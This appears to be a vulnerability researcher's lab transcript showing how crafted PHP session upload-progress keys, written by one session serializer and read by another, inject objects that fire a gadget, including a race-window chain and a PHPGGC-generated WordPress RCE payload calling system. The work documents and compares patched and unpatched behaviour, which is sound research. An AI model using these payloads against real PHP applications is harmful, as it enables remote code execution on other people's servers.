# Lab transcript — key runs (verbatim outputs)

Date: 2026-10-22. PHP 8.4.27 (Debian trixie-security, patched) and PHP 8.2.32
(Debian bookworm pool, pre-patch control). Private loopback lab only.

## 1. Stock `php` handler, plain progress value (auto-start, no session_start)

Request: multipart, `PHP_SESSION_UPLOAD_PROGRESS=hello`, file `a.txt`,
cookie `PHPSESSID=cginormal1`; target script `wwwA/index.php` = `<?php echo "A ok\n";`
(no session call).

```
A stdout: X-Powered-By: PHP/8.4.27 ... A ok
A file exists: True 346
A raw: b'upload_progress_hello|a:5:{s:10:"start_time";i:1792633825;s:14:"content_length";i:213;...
```

Same over nginx+FPM (`cleanup=0`), small upload:

```
200 b'B session keys: upload_progress_small\n'
file: True 347
b'upload_progress_small|a:5:{s:10:"start_time";i:1792634332;...'
```

## 2. `|` in the progress key, stock `php` handler

```
== php handler, '|' in progress value ==
B session keys:
FILE: 0 bytes
RAW : b''
```

The encoder rejected the key; the flush wrote an empty string.

## 3. `|` in the progress key, `php_serialize` writer

```
== php_serialize handler, '|' in progress value ==
FILE: 391 bytes
RAW : b'a:1:{s:52:"upload_progress_x|O:4:"Evil":1:{s:3:"cmd";s:3:"id";}";a:5:{...}}'
```

## 4. Object in the upload *filename*, stock `php` handler

```
FILE: 344 bytes
RAW : b'upload_progress_p|a:5:{...s:4:"name";s:6:"x|O:4:";...}'
B session keys: upload_progress_p
```
(no object; value stays a length-prefixed string; quotes also truncate the
quoted-string filename header)

## 5. Cross-serializer: write `php_serialize`, read `php`

Write (pid cgiser2), then GET with the same SID on an app that registers an autoloader
before `session_start()`:

```
file: b'a:1:{s:52:"upload_progress_x|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}";a:5:{...'
== trigger GET ==
Warning: session_start(): Failed to decode session object. Session has been destroyed ...
B session keys:
POP_FIRED: class=Evil cmd=id
```

## 6. Control: same handler on both sides

```
== same-handler control: raw file ==
FILE: 391 bytes  (php_serialize)
X-Powered-By: PHP/8.4.27
B session keys: upload_progress_x|O:4:"Evil":1:{s:3:"cmd";s:3:"id";}
POP_FIRED: NO
```

## 7. Cross-serializer: write `php`, read `php_binary`

Key crafted so that file offset 118 lands on the payload start (prefix 16 + 102 pad bytes);
no `|` anywhere in the key, so the `php` encoder accepts it.

```
file: True 478 bytes
head: b'upload_progress_AAAAAAAA...AAAO:4:"Evil":1:{s:3:...'
GET output: ... Failed to decode session object ...
POP: class=Evil cmd=id
```

## 8. Pre-RINIT decode, patched 8.4.27, with `opcache.preload`

Preloaded `Evil::__wakeup` and `evil_cb`; hand-written session files
`upload_progress_x|O:4:"Evil":0:{}` and `…"Nope"…`; upload request triggers the decode:

```
8.4.27 patched / preloaded Evil -> 200 b'A ok\n'
8.4.27 patched / unknown class + callback -> 200 b'A ok\n'
--- marker:
NONE (no wakeup, no callback)
```

## 9. Pre-RINIT decode, pre-patch 8.2.32, same preload

```
preloaded Evil rc 0 err
unknown class + callback rc 0 err PHP Warning:  PHP Request Startup: Function evil_cb() hasn't defined the class it was called for in Unknown on line 0
--- marker:
wakeup:Evil
wakeup:Evil
callback:Nope
callback:Nope
--- files:
sess_preevil1  366 bytes
upload_progress_x|O:4:"Evil":0:{}upload_progress_auto|a:5:{...}
```

## 10. Mid-upload race, nginx+FPM, default `cleanup=1`

2 MB upload, pause after 64 KB:

```
MID exists: True size: 326
MID raw: b'upload_progress_racekey|a:5:{s:10:"start_time";...'
AFTER size: 0
```

Same test pausing after only 4 KB: no file mid-upload (SAPI fills 16 KB blocks) —
window starts after the first block.

## 11. Capstone: complete chain on 8.4.27, default `cleanup=1`

Pool A (`php_serialize`, port 9102/nginx 9187) slow upload with
`PHP_SESSION_UPLOAD_PROGRESS=x|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}`;
pool B (`php`, port 9101/nginx 9186) GET during the upload:

```
MID file: True 368
MID raw: b'a:1:{s:52:"upload_progress_x|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}";a:5:{...'
trigger 0 200 b'<br />...Warning: session_start(): Failed to decode session object...'
POP_FIRED: class=Evil cmd=id
AFTER size: 6
```

## 12. Session ID from a body field (no cookie)

```
== SID via body field, no cookie ==
Set-Cookie: PHPSESSID=bf171a82362794ffb742272a9abb0870; path=/
FILE: 349 bytes   (sess_cgibody1)
b'upload_progress_bodysid|a:5:{...'
```

## 13. PHPGGC

```
$ ./phpggc -l            # 170 chains, f8aebde
Laravel 23, Symfony 19, WordPress 18, Drupal 11, Joomla 1, Magento 4, native 0
$ ./phpggc WordPress/RCE2 system id
O:13:"WP_HTML_Token":2:{s:13:"bookmark_name";s:2:"id";s:10:"on_destroy";s:6:"system";}
```

## 14. Version diff for `incomplete_classes_only`

```
php-8.4.26   incomplete_only=NO   pipecheck=YES
php-8.4.27   incomplete_only=YES  pipecheck=YES
php-8.2.34   incomplete_only=NO   pipecheck=YES
php-8.2.35   incomplete_only=YES  pipecheck=YES
php-8.1.34   incomplete_only=NO   pipecheck=YES
php-8.5.11   incomplete_only=NO   pipecheck=YES
```
